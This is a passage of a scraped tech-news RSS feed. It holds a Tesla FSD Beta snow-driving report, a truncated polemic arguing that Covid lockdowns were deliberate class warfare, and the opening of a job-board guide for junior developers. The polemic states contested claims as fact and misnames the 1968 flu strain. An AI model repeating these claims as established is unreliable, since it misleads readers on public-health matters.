<p>Tesla Full Self-Driving (FSD) Beta has now been updated 8 times since its launch back in October. The latest software version for FSD Beta is 2020.48.12.15, which is slightly on a different version path from the <a href="https://www.teslaoracle.com/2020/12/26/tesla-holiday-update-2020-48-26-is-here-v11-gets-delayed-release-notes-video/">2020.48.26 Holiday Update</a>.</p>



<p>The Dual-Motor Tesla Model S with the license plate shouting AIDRIVR has the privilege of being one of the few out there selected by Tesla for FSD Beta testing. In the following video, the owner and driver of this unique Model S takes his car for checking FSD Beta performance out in the snow. </p>



<div><figure><a href="https://evannex.com/?ref=Iqtidar_TeslaOracle_EVANNEX_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/10/evannex_googlead_300x250.jpg" alt="" width="300" height="250" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzI1MCcgd2lkdGg9JzMwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>– Sponsored –</figcaption></figure></div>



<p>The <a href="https://www.teslaoracle.com/topic/model-s/">Tesla Model S</a> in this video is equipped with summer-focused all-season tires, so traction and handling could’ve been better with the winter tires. Tesla’s <a href="https://shop.tesla.com/product/model-s-19_-slipstream-wheel-and-winter-tire-package" target="_blank" rel="noreferrer noopener">online shop</a> offers winter wheels and tire packages for the entire vehicle lineup. The Tesla Model S 19″ slipstream winter wheel and tire package range from $2,500 to $4,000. This Model S package includes the 4 x 245/45/19 – Pirelli Sottozero 3 tires.</p>



<p>In the newer Teslas, the Autopilot cameras are heated, so there is a lower probability of the car’s vision becoming blurred due to snow accumulation. </p>



<h2>In a snowy parking lot</h2>



<p>FSD Beta 8 in this series of tests is first evaluated in an almost empty parking lot with lots of snow. In the beginning, the car refuses to engage <a href="https://www.teslaoracle.com/topic/autopilot/">Autopilot</a> because of invisible road markings. Even when it accepts to be engaged in this snow-filled space, it gets confused and the driving is jerky, at last, it asks the driver to take over and disengages and comes to a full stop when not taken over.</p>



<p><strong>Related:</strong> <a href="https://www.teslaoracle.com/2020/12/18/autopilot-fsd-beta-will-get-absurdly-good-says-elon-musk-v7-test-videos/">FSD Beta 7 test videos in different scenarios.</a></p>



<h2>On the snowy roads</h2>



<p>In the next phase, the driver puts <a href="https://www.teslaoracle.com/topic/autopilot/">FSD Beta</a> on a snowy road to test if it works properly. Lane markings are pretty abrupt even after the heavy snowfall is cleared from the road. Lower grip because of non-winter tires is also a limiting factor here, Autopilot might handover the car to the driver if it feels the slippery situation is not safe.</p>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<p>At the start of the test, Autopilot was able to predict the drivable space but on its own, it was following the posted speed limit of 30 mph. The cruise speed limit then was set to 15 mph manually, in order to be on the safe side in these snowy conditions.</p>



<p>In the drive ahead, the driver had to take over a couple of times, otherwise Tesla Autopilot was able to handle the path pretty well.</p>



<p>By watching the video closely and from the driver’s feedback it can be easily said that <a href="https://www.teslaoracle.com/topic/autopilot/">Tesla Autopilot (FSD Beta)</a> is not yet ready for snowy conditions. It will be a while before Autopilot fully learns snow and the scenarios it puts in front of a car driver. However, the video is still fun to watch and I like the owner’s commentary as he has a good grip on the topic of FSD testing.</p>



<p>Follow us for more on <a href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank" rel="noreferrer noopener">Google News</a>&nbsp;|&nbsp;<a href="https://flipboard.com/@TeslaOracle" target="_blank" rel="noreferrer noopener nofollow">Flipboard</a>&nbsp;|&nbsp;<a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener">RSS </a><a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener nofollow">(</a><a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener">Feedly)</a>.</p>



<figure><div>
<amp-youtube data-videoid="TZ2Cir9OkPY" layout="responsive" width="16" height="9" title="Tesla FSD in the snow (Beta 8)" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://www.youtube.com/watch?v=TZ2Cir9OkPY"><amp-img src="https://i.ytimg.com/vi/TZ2Cir9OkPY/hqdefault.jpg" layout="fill" object-fit="cover" alt="Tesla FSD in the snow (Beta 8)" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div></figure>




		<!-- Adsense Matched -->
        <figure>
        <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="9763094783" data-auto-format="mcrspv" data-full-width="" i-amphtml-layout="fixed">
          
        </amp-ad>
        </figure><!-- Adsense Matched End -->
		</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2020/12/29/fsd-beta-8-tested-for-self-driving-performance-in-snowy-conditions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573378</guid>
            <pubDate>Tue, 29 Dec 2020 18:57:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Great Covid Class War]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25573096">thread link</a>) | @georgecmu
<br/>
December 29, 2020 | https://www.thebellows.org/the-great-covid-class-war/ | <a href="https://web.archive.org/web/*/https://www.thebellows.org/the-great-covid-class-war/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<amp-auto-ads type="adsense" data-ad-client="ca-pub-8554251701278654" i-amphtml-layout="container"></amp-auto-ads> 
<p>On January 19, 2020, Washington state reported the first US case of coronavirus. By the end of March, <a href="https://www.bbc.com/news/world-us-canada-52103066" target="_blank" rel="noreferrer noopener">245 million Americans</a> were under stay-at-home restrictions to “<a href="https://www.washingtonpost.com/graphics/2020/world/corona-simulator/" target="_blank" rel="noreferrer noopener">flatten the curve</a>.” Mainstream news terrorized the public with <a href="https://www.nytimes.com/2020/03/13/science/coronavirus-math-mitigation-distancing.html" target="_blank" rel="noreferrer noopener">exponential</a> graphs, threats of a medical supply <a href="https://www.medtechdive.com/news/hhs-officials-warn-of-medical-supply-shortages-amid-coronavirus-outbreak/573011/" target="_blank" rel="noreferrer noopener">shortage</a>, and displays of <a href="https://www.youtube.com/watch?v=TnLCYqk20YU" target="_blank" rel="noreferrer noopener">hygiene theater</a>. Appeals to science were weaponized to enforce conformity, and the media portrayed anti-lockdown protesters as <a href="https://www.thenation.com/article/politics/lockdown-protest-media/" target="_blank" rel="noreferrer noopener">backwards</a>, <a href="https://www.nytimes.com/2020/04/21/us/politics/coronavirus-protests-trump.html" target="_blank" rel="noreferrer noopener">astroturfed</a> <a href="https://www.wired.com/story/anti-lockdown-protests-online/" target="_blank" rel="noreferrer noopener">white nationalists</a> bent on endangering the public.&nbsp;</p>



<p>Today millions of Americans have <a href="https://www.nytimes.com/2020/10/15/us/politics/federal-aid-poverty-levels.html" target="_blank" rel="noreferrer noopener">fallen into poverty</a> or are on the verge of destitution. Stimulus money has largely been used as a <a href="https://www.propublica.org/article/how-the-coronavirus-bailout-repeats-2008s-mistakes-huge-corporate-payoffs-with-little-accountability" target="_blank" rel="noreferrer noopener">handout to corporations</a>, and over <a href="https://www.forbes.com/sites/christiankreznar/2020/09/16/small-businesses-are-closing-at-a-rapid-pace-with-restaurants-and-retailers-on-the-west-coast-among-the-hardest-hit/?sh=4542ee185033" target="_blank" rel="noreferrer noopener">160,000 small businesses</a> have closed. In March and April <a href="https://www.cnn.com/2020/04/30/economy/unemployment-benefits-coronavirus/index.html" target="_blank" rel="noreferrer noopener">30 million Americans</a> filed for unemployment. Now temporary job losses are <a href="https://www.cnbc.com/2020/10/13/covid-related-unemployment-is-now-permanent-for-almost-4-million.html" target="_blank" rel="noreferrer noopener">becoming permanent</a>. 12 million unemployed people may see their <a href="https://www.politico.com/news/2020/12/11/coronavirus-relief-unemployment-444645" target="_blank" rel="noreferrer noopener">benefits lapse</a> even if Congress passes a new aid deal. Homelessness is <a href="https://www.cbsnews.com/news/covid-19-homelessness-new-york-city/" target="_blank" rel="noreferrer noopener">spiking</a>, 11.4 million households owe <a href="https://www.bloomberg.com/news/articles/2020-12-10/u-s-households-may-be-70-billion-behind-on-rent" target="_blank" rel="noreferrer noopener">$70 billion</a> in back rent and fees, and <a href="https://www.cnn.com/2020/08/07/economy/eviction-stimulus/index.html" target="_blank" rel="noreferrer noopener">40 million</a> people are at risk of eviction. In some states, food bank lines stretch for <a href="https://thehill.com/policy/finance/527462-long-lines-form-at-food-banks-across-country-ahead-of-thanksgiving" target="_blank" rel="noreferrer noopener">miles</a>, and <a href="https://www.feedingamerica.org/sites/default/files/2020-05/Brief_Local%20Impact_5.19.2020.pdf" target="_blank" rel="noreferrer noopener">1 in 4 children</a> are expected to experience food insecurity.&nbsp;</p>



<p>Meanwhile, Walmart and Target <a href="https://www.nytimes.com/2020/08/19/business/coronavirus-walmart-target-home-depot.html" target="_blank" rel="noreferrer noopener">reported record sales</a>. Amazon <a href="https://www.theguardian.com/technology/2020/oct/29/amazon-profits-latest-earnings-report-third-quarter-pandemic" target="_blank" rel="noreferrer noopener">tripled</a> its profits and Jeff Bezos made <a href="https://www.msn.com/en-us/money/companies/jeff-bezos-has-gotten-70-billion-richer-in-the-past-12-months-here-are-11-mind-blowing-facts-that-show-just-how-wealthy-the-amazon-ceo-really-is/ss-BB194gAv?ocid=msedgntp" target="_blank" rel="noreferrer noopener">$70 billion</a>. Billionaires have collectively made over <a href="https://www.forbes.com/sites/niallmccarthy/2020/11/27/us-billionaires-added-1-trillion-to-their-collective-wealth-since-the-start-of-the-pandemic-infographic/?sh=3d09d39366ce" target="_blank" rel="noreferrer noopener">$1 trillion</a> since March. Alphabet, Amazon, Apple, Facebook, and Microsoft now make up <a href="https://www.nytimes.com/2020/08/19/technology/big-tech-business-domination.html" target="_blank" rel="noreferrer noopener">20% of the stock market</a>’s total worth. The tech industry has achieved an unparalleled level of wealth and dominance. Data, which has been <a href="https://www.economist.com/leaders/2017/05/06/the-worlds-most-valuable-resource-is-no-longer-oil-but-data" target="_blank" rel="noreferrer noopener">more valuable than oil</a> since 2017, is expected to expand its <a href="https://www.wsj.com/articles/why-the-u-s-economy-will-take-off-in-2021-11607612401" target="_blank" rel="noreferrer noopener">economic footprint</a>.</p>



<div id="block_5fda90a336c0f">
    <p>
		“This is not an unforced error or a good policy idea implemented poorly. It is an economic agenda disguised as a health protocol.”    </p>
</div>


<p>Unemployment, hunger, institutional breakdown, and the destruction of social bonds are not symptoms of a virus. They are the indirect violence of class warfare. The pandemic is a convenient scapegoat for the largest upward wealth transfer in modern human history. Under the pretext of a public health policy, elites have successfully waged a counterrevolution that will result in the erosion of working conditions and quality of life for generations to come.&nbsp;</p>



<h5><strong>A Self-Fulfilling Prophecy</strong></h5>



<p>Death, disease, and pandemics have always been part of human life and they always will be. <a href="https://www.cdc.gov/nchs/fastats/deaths.htm" target="_blank" rel="noreferrer noopener">2.8 million</a> Americans die every year and <a href="https://ourworldindata.org/causes-of-death" target="_blank" rel="noreferrer noopener">56 million</a> people die worldwide. Each year <a href="https://www.who.int/data/gho/data/themes/tuberculosis" target="_blank" rel="noreferrer noopener">1.3 million</a> people die of tuberculosis, <a href="https://www.unicef.org/press-releases/ten-things-you-didnt-know-about-malaria#:~:text=Almost%20half%20the%20world's%20population,global%20malaria%20control%20is%20slipping." target="_blank" rel="noreferrer noopener">445,000</a> die of malaria, and <a href="https://www.health.com/condition/cold-flu-sinus/how-many-people-die-of-the-flu-every-year" target="_blank" rel="noreferrer noopener">290,000-650,000</a> die of influenza. In 1968 <a href="https://www.britannica.com/event/1968-flu-pandemic" target="_blank" rel="noreferrer noopener">1-4 million</a> people died in the H2N3 influenza pandemic, during which businesses and schools <a href="https://nypost.com/2020/05/16/why-life-went-on-as-normal-during-the-killer-pandemic-of-1969/" target="_blank" rel="noreferrer noopener">stayed open</a> and large events were held.&nbsp;</p>



<p>Indefinite closures have never before been used as a disease control method on a global scale. These experimental restrictions were shaped by the <a href="https://www.theguardian.com/science/2020/mar/25/coronavirus-exposes-the-problems-and-pitfalls-of-modelling" target="_blank" rel="noreferrer noopener">discredited</a> <a href="https://www.imperial.ac.uk/news/196234/covid-19-imperial-researchers-model-likely-impact/" target="_blank" rel="noreferrer noopener">Imperial College Model</a> which <a href="https://www.nytimes.com/2020/03/17/world/europe/coronavirus-imperial-college-johnson.html" target="_blank" rel="noreferrer noopener">predicted</a> 2.2 million US deaths. Many <a href="https://www.wsj.com/articles/is-the-coronavirus-as-deadly-as-they-say-11585088464" target="_blank" rel="noreferrer noopener">epidemiologists</a> and <a href="https://www.nytimes.com/2020/03/20/opinion/coronavirus-pandemic-social-distancing.html" target="_blank" rel="noreferrer noopener">doctors</a> questioned these doomsday projections and pointed out that there was <a href="https://www.statnews.com/2020/03/17/a-fiasco-in-the-making-as-the-coronavirus-pandemic-takes-hold-we-are-making-decisions-without-reliable-data/" target="_blank" rel="noreferrer noopener">not sufficient data</a> to justify lockdowns. The virus has a <a href="https://www.cdc.gov/coronavirus/2019-ncov/hcp/planning-scenarios.html" target="_blank" rel="noreferrer noopener">low</a> mortality rate, especially for people <a href="https://www.sciencedirect.com/science/article/pii/S0013935120307854" target="_blank" rel="noreferrer noopener">under 65</a>, and <a href="https://www.kark.com/news/new-cdc-report-shows-94-of-covid-19-deaths-in-us-had-underlying-medical-conditions/" target="_blank" rel="noreferrer noopener">94%</a> of US covid deaths have occurred with comorbidities. Most <a href="https://www.wsj.com/articles/the-failed-experiment-of-covid-lockdowns-11599000890" target="_blank" rel="noreferrer noopener">statistical analysis</a> does <a href="https://www.frontiersin.org/articles/10.3389/fpubh.2020.604339/full#SM6" target="_blank" rel="noreferrer noopener">not show</a> lockdown measures to be an effective strategy for <a href="https://www.thelancet.com/journals/eclinm/article/PIIS2589-5370(20)30208-X/fulltext" target="_blank" rel="noreferrer noopener">reducing mortality</a>.</p>



<p>In March unprecedented policies were rationalized through shocking <a href="https://www.theguardian.com/world/2020/mar/13/italian-doctor-an-experience-i-would-compare-to-a-world-war" target="_blank" rel="noreferrer noopener">stories</a> and <a href="https://www.youtube.com/watch?v=_J60fQr0GWo" target="_blank" rel="noreferrer noopener">videos</a> from northern Italy. The region’s crowded ICUs were presented as a warning for the rest of Europe and the US. Unknown to many was the fact that Lombardy had been severely impacted by <a href="https://www.nytimes.com/2020/11/19/business/lombardy-italy-coronavirus-doctors.html" target="_blank" rel="noreferrer noopener">ongoing privatization efforts</a> and a <a href="https://www.statista.com/statistics/557042/hospitals-in-italy/" target="_blank" rel="noreferrer noopener">shrinking hospital system</a> regularly overwhelmed by <a href="https://www.sciencedirect.com/science/article/pii/S1201971219303285" target="_blank" rel="noreferrer noopener">influenza</a>. This omission by mainstream media played a key role in developing the mythology that economic shutdown could magically eradicate a virus. In reality lockdowns have accelerated a cycle of austerity and created a self-fulfilling prophecy of perpetual crisis.&nbsp;</p>



<p>Chronic <a href="https://www.cbsnews.com/news/nursing-home-deaths-coronavirus-understaffing/" target="_blank" rel="noreferrer noopener">understaffing</a> and <a href="https://www.nytimes.com/2020/10/29/nyregion/nursing-home-workers-pandemic-jobs.html" target="_blank" rel="noreferrer noopener">lockdown-induced layoffs</a> in nursing homes severely exacerbated covid’s death toll. 40% of US covid deaths are <a href="https://www.forbes.com/sites/jemimamcevoy/2020/06/16/nursing-homes-account-for-over-40-of-us-coronavirus-deaths/?sh=54afb581300b" target="_blank" rel="noreferrer noopener">linked to nursing homes</a>. 1 in 6 covid deaths in Vermont were <a href="https://theintercept.com/2020/12/02/vermont-nursing-home-covid-genesis/" target="_blank" rel="noreferrer noopener">from a single facility</a>. In New York (the state with the <a href="https://www.statista.com/statistics/1109011/coronavirus-covid19-death-rates-us-by-state/" target="_blank" rel="noreferrer noopener">second highest</a> covid deaths per million) hospitals sent over 6,300 elderly covid patients <a href="https://www.nbcnewyork.com/news/coronavirus/new-york-hospitals-sent-6300-recovering-covid-patients-to-nursing-homes/2502812/" target="_blank" rel="noreferrer noopener">back into nursing homes</a>. Unprotected, underserved, and alone, the elderly are also afflicted by the “<a href="https://www.nytimes.com/2020/10/30/us/nursing-homes-isolation-virus.html" target="_blank" rel="noreferrer noopener">slow killer</a>” of loneliness. Isolation increases risk of <a href="https://www.health.harvard.edu/mind-and-mood/loneliness-and-isolation-raise-risk-for-stroke-and-heart-disease-study-suggests" target="_blank" rel="noreferrer noopener">heart disease, stroke</a>, and <a href="https://www.alzinfo.org/articles/feeling-lonely-increases-alzheimers-risk-2/" target="_blank" rel="noreferrer noopener">Alzheimer’s</a>. It is <a href="https://www.webmd.com/balance/news/20180504/loneliness-rivals-obesity-smoking-as-health-risk" target="_blank" rel="noreferrer noopener">as deadly</a> as obesity or smoking 15 cigarettes a day.</p>



<p>Financial insecurity will exacerbate these health risks for the elderly. Economic shutdown has <a href="https://www.ft.com/content/d1fce3e7-428b-4b8a-ab6a-119a38fa1e7d" target="_blank" rel="noreferrer noopener">weakened</a> global pension funds and they may not recover. Millions of Baby Boomers have been forced into <a href="https://www.forbes.com/sites/jackkelly/2020/11/19/nearly-30-million-baby-boomers-forced-into-unwanted-retirement/?sh=4fb8019d5d7d" target="_blank" rel="noreferrer noopener">early retirement</a> without adequate savings. Many Americans are <a href="https://www.cnbc.com/2020/09/14/americans-are-forced-to-raid-retirement-savings-during-the-pandemic.html" target="_blank" rel="noreferrer noopener">dipping into their retirement funds early</a>. The Congressional Budget Office projects that $2.8 trillion in Social Security funds will be <a href="https://thehill.com/policy/finance/528268-covid-19-damage-to-social-security-to-extend-beyond-pandemic" target="_blank" rel="noreferrer noopener">used up in a decade</a> due to the impact of un- and underemployment on lowering contributions.</p>



<div id="block_5fda90f836c10">
    <p>
		“Income is the main determinant of covid mortality.”    </p>
</div>


<p>Outcomes of lockdown are equally grim for children. Even if K-12 schools reopen in January 2021, the average student will have lost <a href="https://www.washingtonpost.com/education/students-falling-behind/2020/12/06/88d7157a-3665-11eb-8d38-6aea1adb3839_story.html" target="_blank" rel="noreferrer noopener">7 months of instruction</a>. Because literacy and education levels are a main <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2713445/" target="_blank" rel="noreferrer noopener">predictor of longevity</a>, these learning losses represent years of life stolen from students. Moreover, cases of severe abuse and mental-health related ER visits <a href="https://apnews.com/article/anxiety-mental-health-boston-coronavirus-pandemic-massachusetts-004adb5ee0ef17ff4b5e2e294e36ff3d" target="_blank" rel="noreferrer noopener">are surging for children</a>. They will also experience <a href="https://www.nytimes.com/2020/11/25/opinion/sunday/covid-quarantine-children-immune-systems.html" target="_blank" rel="noreferrer noopener">weakened immune systems</a> due to lack of exposure to seasonal viruses and natural pathogens.</p>



<p>For people with chronic health conditions or those in need of urgent medical treatment, the short- and long-term consequences of lockdown are disastrous. In the United States, cancer screenings fell by <a href="https://www.radiologybusiness.com/topics/healthcare-economics/cancer-screenings-epic-ehr-covid-19-coronavirus" target="_blank" rel="noreferrer noopener">86-94%</a> in the spring. Many hospitals <a href="https://www.beckershospitalreview.com/finance/47-hospitals-closed-filed-for-bankruptcy-this-year.html" target="_blank" rel="noreferrer noopener">had to close</a> due to lack of revenue from routine surgeries and procedures. Hospitals are expected to lose a total of <a href="https://www.aha.org/news/headline/2020-06-30-aha-report-hospital-financial-losses-covid-19-expected-top-323-billion#:~:text=An%20AHA%20report%20released%20today,least%20%24323%20billion%20in%202020." target="_blank" rel="noreferrer noopener">$323 billion</a> this year. <a href="https://www.npr.org/2020/05/10/853524764/amid-pandemic-hospitals-lay-off-1-4m-workers-in-april" target="_blank" rel="noreferrer noopener">1.4 million hospital staff</a> were laid off in April while private health insurance companies <a href="https://www.nytimes.com/2020/08/05/health/covid-insurance-profits.html" target="_blank" rel="noreferrer noopener">doubled their earnings</a>.&nbsp;</p>



<p>In the absence of meaningful investments in healthcare infrastructure, the covid mitigation strategies being pushed by federal, state, and local governments are neither credible nor effective. Elected officials routinely amplify raw case numbers in order to stoke fear and blame individuals for viral spread. As a result, we are currently “saving lives” by killing people. This is not an unforced error or a good policy idea implemented poorly. It is an economic agenda disguised as a health protocol.</p>



<h5>The New Caste System&nbsp;</h5>



<p>California Governor Gavin Newsom sends his children to <a href="https://www.politico.com/states/california/story/2020/10/30/newsom-sends-his-children-back-to-school-classrooms-in-california-1332811" target="_blank" rel="noreferrer noopener">in-person private school</a> while mandating virtual education for California public schools. He announced a <a href="https://www.theguardian.com/world/2020/dec/06/california-covid-lockdown-us-new-cases-hospitalisations-deaths-stay-at-home-order" target="_blank" rel="noreferrer noopener">second statewide lockdown</a> just a few weeks after attending an indoor, unmasked <a href="https://www.politico.com/news/2020/11/18/newsom-lobbyist-dinner-party-437892" target="_blank" rel="noreferrer noopener">dinner with lobbyists</a> at a Michelin three star restaurant where meals can cost up to <a href="https://sf.eater.com/2020/9/3/21421335/french-laundry-yountville-thomas-keller-indoor-dining-rich-people" target="_blank" rel="noreferrer noopener">$850 per person</a>. Newsom is just one of many <a href="https://www.nytimes.com/2020/11/23/nyregion/cuomo-thanksgiving-mother.html" target="_blank" rel="noreferrer noopener">politicians</a>, elites, and <a href="https://www.wsj.com/articles/mask-mischief-11595625179" target="_blank" rel="noreferrer noopener">bureaucrats</a> who break the rules. A static social order is being solidified. In our new caste system the wealthy have political and social <a href="https://www.bloomberg.com/news/articles/2020-12-03/u-k-to-exempt-high-value-business-travelers-from-quarantine" target="_blank" rel="noreferrer noopener">privileges</a> because they are considered clean and disease-free, while the more low-income someone is, the more they are treated as contaminated.&nbsp;</p>



<p>The goal of lockdown enthusiasts in the “work from home” caste is to shift risk away from themselves and onto essential workers and the poor. <a href="https://www.bbc.com/worklife/article/20201023-coronavirus-how-will-the-pandemic-change-the-way-we-work" target="_blank" rel="noreferrer noopener">Only 40%</a> of the workforce can afford to stay home. <a href="https://www.commonwealthfund.org/publications/issue-briefs/2020/aug/looming-crisis-health-coverage-2020-biennial#:~:text=In%20the%20first%20half%20of%202020%2C%2043.4%20percent%20of%20U.S.,uninsured%20rate%20was%2012.5%20percent." target="_blank" rel="noreferrer noopener">43% of US adults</a> do not have adequate health insurance, and only 31% of low-paid workers have <a href="https://www.pewresearch.org/fact-tank/2020/03/12/as-coronavirus-spreads-which-u-s-workers-have-paid-sick-leave-and-which-dont/" target="_blank" rel="noreferrer noopener">paid sick leave</a> compared to 92% of high-paid workers. “Stay home” is the self-congratulatory mantra of professionals who believe that their virtuous behavior prevents them from contracting covid. In fact, income is the <a href="https://prospect.org/coronavirus/covid-19-class-war-death-rates-income/" target="_blank" rel="noreferrer noopener">main determinant</a> of covid mortality.</p>



<p>Lockdown fanatics have helped manufacture consent for a brutal reorganization of labor that will plunge millions of people into serfdom. The work-from-home lifestyle is only possible through the labor of logistics workers who transport, sort, and deliver goods. Currently about <a href="https://www.nytimes.com/live/2020/12/04/business/us-economy-coronavirus" target="_blank" rel="noreferrer noopener">10 million jobs</a> that existed in February have not been replaced. Many workers have been forced to take on part-time, no-contract work, a labor model that is <a href="https://qz.com/1556194/the-gig-economy-is-quietly-undermining-a-century-of-worker-protections/" target="_blank" rel="noreferrer noopener">rolling back</a> decades of hard-fought protections.&nbsp;&nbsp;</p>



<p>Under the Obama/Biden administration, 94% of new jobs created were gig work, and in 2017 <a href="https://www.ilo.org/washington/WCMS_642303/lang--en/index.htm#:~:text=The%20Bureau%20of%20Labor%20Statistics,to%2043%20percent%20in%202020." target="_blank" rel="noreferrer noopener">34% of the workforce</a> was employed through the gig economy. Shutdowns are accelerating this trend, with food delivery apps <a href="https://www.nytimes.com/2020/11/30/nyregion/bike-delivery-workers-covid-pandemic.html" target="_blank" rel="noreferrer noopener">growing their profits</a> as workers struggle to get by. Subscription platforms like OnlyFans saw a <a href="https://www.sfchronicle.com/bayarea/article/Coronavirus-took-their-jobs-away-OnlyFans-let-15175650.php" target="_blank" rel="noreferrer noopener">surge in accounts</a> at the beginning of lockdown. In March the company saw a <a href="https://www.nytimes.com/2020/04/10/style/camsoda-onlyfans-streaming-sex-coronavirus.html" target="_blank" rel="noreferrer noopener">75% increase in users and 60,000 new creators</a>. Lockdown has made OnlyFans a <a href="https://www.bloomberg.com/news/articles/2020-12-05/celebrities-like-cardi-b-could-turn-onlyfans-into-a-billion-dollar-media-company" target="_blank" rel="noreferrer noopener">billion dollar business</a>, but the majority of creators make less than <a href="https://www.xsrus.com/writing/explain/onlyfans/" target="_blank" rel="noreferrer noopener">$145 a month</a>.&nbsp;</p>






<p>Internationally, workplace closures and supply chain disruptions will result in the loss of <a href="http://ilo.org/global/about-the-ilo/newsroom/news/WCMS_743036/lang--en/index.html" target="_blank" rel="noreferrer noopener">305 million</a> jobs. <a href="https://www.ilo.org/global/topics/employment-promotion/informal-economy/publications/WCMS_743534/lang--en/index.htm" target="_blank" rel="noreferrer noopener">1.6 billion</a> informal economy workers are at risk of losing their livelihoods. This devastation will be compounded by famine and the increased <a href="https://www.nytimes.com/2020/08/03/health/coronavirus-tuberculosis-aids-malaria.html" target="_blank" rel="noreferrer noopener">spread of untreated diseases</a> like <a href="https://www.sciencedaily.com/releases/2020/06/200624103257.htm" target="_blank" rel="noreferrer noopener">tuberculosis</a>. In July closed food markets were linked to <a href="https://apnews.com/article/lifestyle-ap-top-news-understanding-the-outbreak-hunger-international-news-5cbee9693c52728a3808f4e7b4965cbd" target="_blank" rel="noreferrer noopener">10,000 child deaths a month</a>. <a href="https://www.nytimes.com/2020/04/11/business/coronavirus-destroying-food.html" target="_blank" rel="noreferrer noopener">Food is being discarded</a> and crops are rotting in the fields while the number of people facing acute hunger this year has doubled to <a href="https://www.nytimes.com/2020/04/22/world/africa/coronavirus-hunger-crisis.html">265 </a><a href="https://www.nytimes.com/2020/04/22/world/africa/coronavirus-hunger-crisis.html" target="_blank" rel="noreferrer noopener">million</a>.&nbsp;</p>



<p>At the start of the covid crisis, vocal segments of the American left argued that economic shutdown was a way to resist <a href="https://jacobinmag.com/2020/03/donald-trump-wall-street-coronavirus-profits" target="_blank" rel="noreferrer noopener">billionaires</a> and <a href="https://www.dsausa.org/democratic-left/we-need-a-global-democratic-socialist-response-to-covid-19/" target="_blank" rel="noreferrer noopener">capitalism</a>. This demonstrated a deep misunderstanding of the way <a href="https://www.investopedia.com/financial-edge/0411/5-investors-that-are-both-rich-and-smart.aspx" target="_blank" rel="noreferrer noopener">financiers can profit</a> from economic contraction. Many on the left chose to ignore the Biblical scale of the destruction that economic stoppages would cause, arguing that the covid crisis was an <a href="https://jacobinmag.com/2020/03/quarantine-coronavirus-economy-left-organizing" target="_blank" rel="noreferrer noopener">opportunity</a>. Today the left continues to advance the illusion that <a href="https://jacobinmag.com/2020/11/joe-biden-coronavirus-pandemic-relief" target="_blank" rel="noreferrer noopener">meaningful relief</a> is possible, while workers’ pensions are plundered, children’s futures disappear, and <a href="https://www.cnn.com/2020/10/07/economy/global-poverty-rate-coronavirus/index.html" target="_blank" rel="noreferrer noopener">150 …</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thebellows.org/the-great-covid-class-war/">https://www.thebellows.org/the-great-covid-class-war/</a></em></p>]]>
            </description>
            <link>https://www.thebellows.org/the-great-covid-class-war/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573096</guid>
            <pubDate>Tue, 29 Dec 2020 18:33:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for Getting Hired as a Junior Dev Using Job Boards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25572995">thread link</a>) | @asebold
<br/>
December 29, 2020 | https://getadevjob.io/post/tips-for-getting-hired-as-a-junior-dev-using-job-boards/ | <a href="https://web.archive.org/web/*/https://getadevjob.io/post/tips-for-getting-hired-as-a-junior-dev-using-job-boards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
						<p>
							By <i>Allison Seboldt</i> | 4 min read
						</p>
					
<p>If you’re coming into tech from a different industry, or fresh out of college, the process of finding your first job can be painful and frustrating. I’ve seen a lot of new devs struggle with the application process. So, I put together a little guide for using one of the most easily accessible hiring resources: job boards!</p>
<p>Think <a href="https://www.indeed.com/">Indeed</a>, <a href="https://www.monster.com/">Monster</a>, <a href="https://www.careerbuilder.com/">Career Builder</a>, etc… You’re likely familiar with these kinds of websites and have maybe used them before. They typically consist of creating a profile, then using keywords to search for open positions. There are lots of different kinds of job boards out there for developers. Some are specific to tech (<a href="https://stackoverflow.com/jobs">Stack Overflow</a>, <a href="https://www.cybercoders.com/">Cyber Coders</a>, <a href="https://www.dice.com/">Dice</a>), certain languages (<a href="https://vuejobs.com/">Vue Jobs</a>, <a href="https://www.rubyjobs.com/">Ruby Jobs</a>), lifestyle (<a href="https://weworkremotely.com/">We Work Remotely</a>, <a href="https://jobspresso.co/">Jobspresso</a>), and even values (<a href="https://www.diversifytech.co/job-board/">Diversify Tech</a>). These websites are incredibly helpful because they make applying for many jobs in a short amount of time easy. And because getting an interview is essentially a numbers game, that’s a huge advantage.&nbsp;</p>
